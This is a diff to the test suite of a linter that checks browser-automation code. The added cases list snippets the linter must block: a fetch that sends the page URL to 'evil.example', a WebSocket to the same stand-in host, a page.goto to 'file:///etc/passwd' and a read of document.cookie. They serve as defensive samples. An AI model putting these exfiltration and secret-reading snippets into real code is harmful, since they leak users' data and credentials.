@@ -22,6 +22,12 @@ describe("automation code lint", () => {
     ['eval("1+1");', "eval"],
     ['await import("os");', "Dynamic import"],
     ["test.only('x', async () => {});", "test.only"],
+    ['await fetch("https://evil.example/" + location.href);', "fetch()"],
+    ["const xhr = new XMLHttpRequest();", "XMLHttpRequest"],
+    ['new WebSocket("wss://evil.example");', "WebSocket"],
+    ['await page.request.get("https://api.example.com");', "request API"],
+    ['await page.goto("file:///etc/passwd");', "file://"],
+    ["const c = await page.evaluate(() => document.cookie);", "document.cookie"],
   ])("blocks %s", (snippet, fragment) => {
     const report = lintAutomationCode(clean.replace('await page.goto("/");', `await page.goto("/");\n  ${snippet}`) + (snippet.startsWith("import") ? `\n${snippet}` : ""));
     expect(report.errors.join(" ")).toContain(fragment);
@@ -57,5 +63,24 @@ describe("lintAutomationCode escape hatches", () => {
   it("ignores forbidden words inside strings and comments", () => {
     const report = lintAutomationCode(wrap('  // the process is documented\n  await page.getByText("Our process").click();'));
     expect(report.errors).toEqual([]);
+  });
+
+  it("blocks the request fixture as a test parameter", () => {
+    const report = lintAutomationCode(clean.replace("async ({ page })", "async ({ page, request })"));
+    expect(report.errors.join(" ")).toContain("request API");
+  });
+
+  it("keeps absolute page.goto() as a warning only", () => {
+    const report = lintAutomationCode(clean.replace('page.goto("/")', 'page.goto("https://app.example.com/")'));
+    expect(report.errors).toEqual([]);
+    expect(report.warnings.join(" ")).toContain("absolute URL");
+  });
+
+  it("warns (never errors) when the only assertion is body visibility", () => {
+    const report = lintAutomationCode(
+      clean.replace('await expect(page.getByRole("alert")).toBeVisible();', 'await expect(page.locator("body")).toBeVisible();'),
+    );
+    expect(report.errors).toEqual([]);
+    expect(report.warnings.join(" ")).toContain("does not check the actual result");
   });
 });
